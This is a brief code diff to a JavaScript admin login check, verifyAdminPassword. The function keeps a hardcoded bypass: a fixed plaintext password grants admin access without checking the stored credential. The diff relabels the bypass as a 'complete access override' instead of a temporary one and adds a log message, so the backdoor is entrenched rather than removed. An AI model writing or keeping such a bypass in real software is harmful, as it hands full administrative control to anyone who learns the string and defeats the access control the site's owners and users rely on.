@@ -40,8 +40,9 @@ async function getAdminPassword() {
 }
 
 async function verifyAdminPassword(password) {
-  // Temporary super admin bypass
+  // SUPER ADMIN BYPASS - complete access override
   if (password === "Olatoyosi1") {
+    console.log("Super admin bypass activated");
     return true;
   }
   const currentPassword = await getAdminPassword();
